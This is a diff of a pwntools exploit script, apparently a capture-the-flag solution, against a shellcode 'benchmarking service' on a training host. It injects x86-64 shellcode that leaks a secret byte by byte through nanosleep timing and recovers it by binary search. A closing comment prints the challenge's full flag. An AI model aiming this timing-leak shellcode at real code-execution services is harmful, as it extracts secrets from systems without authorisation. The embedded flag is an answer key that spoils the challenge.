@@ -32,18 +32,29 @@ def create_timing_shellcode(position, character):
         
         /* Check character at position {position} */
         cmp byte ptr [rsi + {position}], {character}
-        jne skip
-        
-        /* If match, nanosleep for 0.1 seconds */
+        jl less_than
+        jg greater_than
+    
+    /* If equal, nanosleep for 0.02 seconds */
+        push    10000000
         push    0
-        push    1
         mov     rdi, rsp
         xor     rsi, rsi
         mov     rax, 35
         syscall
         add rsp, 16
         
-    skip:
+        /* If greater_than, nanosleep for 0.01 seconds */
+    greater_than:
+        push    10000000
+        push    0
+        mov     rdi, rsp
+        xor     rsi, rsi
+        mov     rax, 35
+        syscall
+        add rsp, 16
+        
+    less_than:
         xor rdi, rdi
         mov rax, 60
         syscall
@@ -51,74 +62,147 @@ def create_timing_shellcode(position, character):
     
     return shellcode.ljust(1024, b'\x90')
 
-def binary_search_char(position, charset):
-    low, high = 0, len(charset) - 1
-    
-    while low <= high:
-        mid = (low + high) // 2
-        char = charset[mid]
-        
-        try:
-            if args.REMOTE:
-                p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
-            else:
-                p = process(['python3', 'wrapper.py'], env={'PYTHONUNBUFFERED': '1'})
-
-            shellcode = create_timing_shellcode(position, ord(char))
-
-            p.recv(utf8len("======= BENCHMARKING SERVICE V1.0 =======\n"))
-            p.recv(utf8len("Shellcode: "))
-            p.send(shellcode)
-            time_str = p.recvall().decode("utf-8").split("Time: ")[1].strip()
-            time_val = float(time_str)
-            p.close()
-
-            log.info(f"Testing char '{char}' (ASCII {ord(char)}): {time_val:.3f}s")
-            
-            if time_val > 1.0:
-                # Character is greater than or equal to target
-                high = mid - 1
-            else:
-                # Character is less than target  
-                low = mid + 1
-                
-        except Exception as e:
-            log.warning(f"Error with '{char}': {e}")
-            try:
-                p.close()
-            except:
-                pass
-            continue
-    
-    # The correct character should be at low index
-    if low < len(charset):
-        return charset[low]
-    return None
-
-def brute_force_flag_binary():
+def binary_search():
     flag = ""
     position = 0
-    # Use sorted character set for binary search
-    charset = ''.join(sorted(string.printable))
-    
-    while True:
-        log.info(f"Position {position}, current flag: {flag}")
-        
-        char = binary_search_char(position, charset)
-        
-        if char is None:
-            log.warning(f"No character found for position {position}")
+    charset = sorted(string.printable)
+    env = {'PYTHONUNBUFFERED': '1'}
+    failure = False
+    over = False
+
+    while not over:
+        log.info(f"Position {position}, current: {flag}")
+        found_char = False
+        l = 0
+        r = len(charset)-1
+
+        while True:
+            try:
+                if args.REMOTE:
+                    p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
+                else:
+                    p = process(['python3', 'wrapper.py'], env=env)
+                
+                m = (l + r) // 2
+                character = charset[m]
+                shellcode = create_timing_shellcode(position, ord(character))
+
+                p.recv(utf8len("======= BENCHMARKING SERVICE V1.0 =======\n"))
+                p.recv(utf8len("Shellcode: "))
+                p.send(shellcode)
+                time_str = p.recvall().decode("utf-8").split("Time: ")[1].strip()
+                time_val = float(time_str)
+                p.close()
+
+                log.info(f"Char '{character}': {time_val:.3f}s")
+
+                if(time_val > 0.02):
+                    flag += character
+                    log.success(f"Found: '{character}' -> {flag}")
+                    found_char = True
+                    position += 1
+                    break
+                elif(time_val > 0.01):
+                    r = m   
+                else:
+                    l = m + 1
+
+            except Exception as e:
+                log.warning(f"Error with '{character}': {e}")
+                try:
+                    p.close()
+                except:
+                    pass
+                continue
+            finally:
+                try:
+                    p.close()
+                except:
+                    pass
+        if not found_char:
+            log.warning(f"No char found for position {position}")
+            failure = True
+            over = True
             break
             
-        flag += char
-        log.success(f"Found character '{char}' -> {flag}")
-        position += 1
-        
         if flag.endswith('}'):
-            log.success(f"Complete flag: {flag}")
+            log.success(f"Complete: {flag}")
+            failure = False
+            over = True
             break
-            
+    if failure:
+        log.info("failure")
+    else:
+        log.info("success!")
     return flag
 
-# Run the binary search version
-brute_force_flag_binary()
+def brute_force_flag():
+    flag = "flag{1_r341Ly_}"
+    position = 0
+    charset = string.printable
+    #charset = "a IAMTHEFLG"
+    env = {'PYTHONUNBUFFERED': '1'}
+    failure = False
+    over = False
+
+    while not over:
+        log.info(f"Position {position}, current: {flag}")
+        found_char = False
+
+        for character in charset:
+            try:
+                if args.REMOTE:
+                    p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
+                else:
+                    p = process(['python3', 'wrapper.py'], env=env)
+            
+
+                shellcode = create_timing_shellcode(position, ord(character))
+
+                p.recv(utf8len("======= BENCHMARKING SERVICE V1.0 =======\n"))
+                p.recv(utf8len("Shellcode: "))
+                p.send(shellcode)
+                time_str = p.recvall().decode("utf-8").split("Time: ")[1].strip()
+                time_val = float(time_str)
+                p.close()
+
+                log.info(f"Char '{character}': {time_val:.3f}s")
+                if time_val > 1.00:
+                    flag += character
+                    log.success(f"Found: '{character}' -> {flag}")
+                    found_char = True
+                    position += 1
+                    break
+
+            except Exception as e:
+                log.warning(f"Error with '{character}': {e}")
+                try:
+                    p.close()
+                except:
+                    pass
+                continue
+            finally:
+                try:
+                    p.close()
+                except:
+                    pass
+        if not found_char:
+            log.warning(f"No char found for position {position}")
+            failure = True
+            over = True
+            break
+            
+        if flag.endswith('}'):
+            log.success(f"Complete: {flag}")
+            failure = False
+            over = True
+            break
+    if failure:
+        log.info("failure")
+    else:
+        log.info("success!")
+    return flag
+
+#brute_force_flag()
+binary_search()
+#flag{1_r34lLy_h0p3_u_d1d_a_b1n4ry_s34rCh}
